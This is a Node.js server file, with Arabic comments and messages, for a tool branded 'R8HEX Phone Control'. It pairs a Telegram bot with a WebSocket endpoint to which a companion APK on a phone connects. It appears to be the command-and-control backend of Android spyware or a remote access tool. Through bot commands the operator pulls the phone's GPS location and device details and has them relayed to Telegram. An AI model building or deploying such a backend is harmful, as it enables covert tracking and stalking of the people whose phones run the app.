const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const http = require('http');
const { token, id } = require('./data');

const app = express();
const server = http.createServer(app);

// 🔧 استخدم polling عادي
const bot = new TelegramBot(token, { 
    polling: true 
});

// 🚀 WebSocket على نفس السيرفر
const wss = new WebSocket.Server({ 
    server: server,
    path: '/ws'
});

// تخزين البيانات
const connectedPhones = new Map();

// 🔧 احصل على الرابط الحالي تلقائياً
const CURRENT_URL = process.env.RENDER_EXTERNAL_URL || 'https://king14-85jp.onrender.com';
const WS_URL = CURRENT_URL.replace('https://', 'wss://').replace('http://', 'ws://') + '/ws';

console.log(`🌐 Current URL: ${CURRENT_URL}`);
console.log(`📱 WebSocket URL: ${WS_URL}`);

// 🔧 middleware أساسي
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 🏠 صفحة الرئيسية
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>R8HEX Phone Control</title>
            <meta charset="utf-8">
            <style>
                body { 
                    font-family: Arial, sans-serif; 
                    text-align: center; 
                    padding: 50px; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                }
                .container {
                    background: rgba(255,255,255,0.1);
                    padding: 30px;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                    max-width: 600px;
                    margin: 0 auto;
                }
                .status { 
                    color: #4CAF50; 
                    font-weight: bold;
                    font-size: 24px;
                }
                code {
                    background: rgba(0,0,0,0.3);
                    padding: 10px;
                    border-radius: 5px;
                    display: block;
                    margin: 10px 0;
                    word-break: break-all;
                }
                .btn {
                    background: #4CAF50;
                    color: white;
                    padding: 10px 20px;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    margin: 10px;
                    text-decoration: none;
                    display: inline-block;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🎮 R8HEX Phone Control System</h1>
                <p class="status">✅ السيرفر شغال بنجاح</p>
                <p>📱 الأجهزة المتصلة: <strong>${connectedPhones.size}</strong></p>
                <p>🌐 رابط WebSocket للـ APK:</p>
                <code id="wsUrl">${WS_URL}</code>
                <button class="btn" onclick="copyUrl()">نسخ الرابط</button>
                <p>📞 Chat ID: <strong>${id}</strong></p>
                <p>⚡ المطور: @A1BUG</p>
                <p>🔗 الرابط الحالي: <strong>${CURRENT_URL}</strong></p>
            </div>
            
            <script>
                function copyUrl() {
                    const url = document.getElementById('wsUrl').innerText;
                    navigator.clipboard.writeText(url).then(() => {
                        alert('تم نسخ الرابط: ' + url);
                    });
                }
            </script>
        </body>
        </html>
    `);
});

// 🎯 معالج الأمر /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    // تحقق إذا المستخدم مسموح
    if (chatId.toString() !== id) {
        return bot.sendMessage(chatId, '❌ غير مصرح لك باستخدام هذا البوت.');
    }
    
    const welcomeMessage = `
🎮 **R8HEX - نظام التحكم في الهاتف**

✅ **السيرفر شغال بنجاح!**
🌐 **رابط WebSocket للـ APK**:
\`${WS_URL}\`

📱 **أرسل هذا الرابط لملف الـ APK**

🔧 **الأوامر المتاحة**:
/info - معلومات الجهاز
/location - الموقع الحالي
/status - حالة الاتصال
/url - عرض الرابط الحالي

⚡ **المطور**: @A1BUG
    `;
    
    bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
});

// 📍 أمر الموقع
bot.onText(/\/location/, (msg) => {
    const chatId = msg.chat.id.toString();
    
    if (chatId !== id) {
        return bot.sendMessage(chatId, '❌ غير مصرح لك باستخدام هذا البوت.');
    }
    
    const phone = connectedPhones.get(chatId);
    if (phone && phone.readyState === WebSocket.OPEN) {
        phone.send(JSON.stringify({
            type: 'command',
            command: 'get_location',
            chatId: chatId
        }));
        bot.sendMessage(chatId, '📍 جاري طلب الموقع من الهاتف...');
    } else {
        bot.sendMessage(chatId, `❌ لا يوجد هاتف متصل.

🔧 **لحل المشكلة**:
1. تأكد أن الـ APK شغال
2. استخدم الرابط الصحيح في الـ APK:
\`${WS_URL}\`
3. تأكد أن الـ APK يرسل chatId: ${id}
        `, { parse_mode: 'Markdown' });
    }
});

// 📱 أمر معلومات الجهاز
bot.onText(/\/info/, (msg) => {
    const chatId = msg.chat.id.toString();
    
    if (chatId !== id) {
        return bot.sendMessage(chatId, '❌ غير مصرح لك.');
    }
    
    const phone = connectedPhones.get(chatId);
    if (phone && phone.readyState === WebSocket.OPEN) {
        phone.send(JSON.stringify({
            type: 'command', 
            command: 'get_device_info',
            chatId: chatId
        }));
        bot.sendMessage(chatId, '📊 جاري طلب معلومات الجهاز...');
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل.');
    }
});

// 🔗 أمر عرض الرابط
bot.onText(/\/url/, (msg) => {
    const chatId = msg.chat.id.toString();
    
    if (chatId !== id) {
        return bot.sendMessage(chatId, '❌ غير مصرح لك.');
    }
    
    bot.sendMessage(chatId, `🔗 **روابط السيرفر**:

🌐 الموقع: ${CURRENT_URL}
📱 WebSocket: \`${WS_URL}\`
👤 Chat ID: ${id}

📋 **للاتصال بالـ APK**:
1. افتح الـ APK
2. أدخل هذا الرابط: \`${WS_URL}\`
3. أدخل Chat ID: \`${id}\`
    `, { parse_mode: 'Markdown' });
});

// 📊 أمر حالة الاتصال
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id.toString();
    
    if (chatId !== id) {
        return bot.sendMessage(chatId, '❌ غير مصرح لك.');
    }
    
    const phone = connectedPhones.get(chatId);
    const status = phone && phone.readyState === WebSocket.OPEN ? '✅ متصل' : '❌ غير متصل';
    
    bot.sendMessage(chatId, `📊 **حالة الاتصال**:

📱 الهاتف: ${status}
🔗 الاتصالات النشطة: ${connectedPhones.size}
🌐 السيرفر: ${CURRENT_URL}
📡 WebSocket: ${WS_URL}
    `, { parse_mode: 'Markdown' });
});

// 🔌 معالج اتصالات WebSocket
wss.on('connection', (ws, req) => {
    console.log('📱 هاتف جديد متصل من:', req.socket.remoteAddress);
    
    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);
            handlePhoneMessage(ws, message);
        } catch (error) {
            console.error('❌ خطأ في معالجة الرسالة:', error);
        }
    });

    ws.on('close', () => {
        for (let [phoneId, connection] of connectedPhones.entries()) {
            if (connection === ws) {
                connectedPhones.delete(phoneId);
                console.log(`📱 الهاتف ${phoneId} انقطع`);
                
                // إعلام المستخدم
                if (phoneId === id) {
                    bot.sendMessage(phoneId, '📱 **انقطع الاتصال بالهاتف**');
                }
                break;
            }
        }
    });
    
    // إرسال رسالة ترحيب للهاتف
    ws.send(JSON.stringify({
        type: 'welcome',
        message: 'تم الاتصال بالسيرفر بنجاح',
        server: CURRENT_URL
    }));
});

// 📨 معالج رسائل الهاتف
function handlePhoneMessage(ws, message) {
    console.log('📩 رسالة من الهاتف:', message.type);
    
    switch (message.type) {
        case 'register':
            // تسجيل الهاتف
            const chatId = message.chatId;
            connectedPhones.set(chatId, ws);
            console.log(`✅ هاتف مسجل للمستخدم: ${chatId}`);
            
            // إرسال تأكيد للمستخدم
            if (chatId === id) {
                bot.sendMessage(chatId, `✅ **تم الاتصال بالهاتف بنجاح!**

📱 الهاتف متصل الآن
🌐 السيرفر: ${CURRENT_URL}
🔗 يمكنك الآن استخدام الأوامر

🔧 **جرب هذه الأوامر**:
/location - للحصول على الموقع
/info - لمعلومات الجهاز
/status - لحالة الاتصال
                `, { 
                    parse_mode: 'Markdown'
                });
            }
            break;
            
        case 'location':
            bot.sendMessage(message.chatId, `
📍 **الموقع الحالي**:
🌍 الإحداثيات: ${message.lat}, ${message.lng}
🏠 العنوان: ${message.address || 'غير متوفر'}
📶 الدقة: ${message.accuracy || 'N/A'} متر
            `);
            
            // إرسال موقع على الخريطة إذا كانت الإحداثيات موجودة
            if (message.lat && message.lng) {
                bot.sendLocation(message.chatId, message.lat, message.lng);
            }
            break;
            
        case 'device_info':
            bot.sendMessage(message.chatId, `
📱 **معلومات الجهاز**:
📟 النموذج: ${message.model || 'غير معروف'}
🔢 الإصدار: ${message.version || 'غير معروف'} 
💾 الذاكرة: ${message.memory || 'غير معروف'}
🖥️ الشاشة: ${message.display || 'غير معروف'}
🔋 البطارية: ${message.battery || 'غير معروف'}
            `);
            break;
            
        case 'response':
            bot.sendMessage(message.chatId, `📨 ${message.text}`);
            break;
            
        case 'ping':
            // رد على ping
            ws.send(JSON.stringify({
                type: 'pong',
                timestamp: Date.now()
            }));
            break;
            
        default:
            console.log('📩 رسالة غير معروفة:', message);
    }
}

// 🚀 تشغيل السيرفر
const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 R8HEX Server running on port ${PORT}`);
    console.log(`🤖 Bot: R8HEX_Bot`);
    console.log(`📱 WebSocket: ${WS_URL}`);
    console.log(`🌐 Website: ${CURRENT_URL}`);
    console.log(`👤 Authorized User: ${id}`);
});

// 🔧 معالج الأخطاء
process.on('uncaughtException', (error) => {
    console.error('❌ خطأ غير متوقع:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ رفض غير معالج:', reason);
});
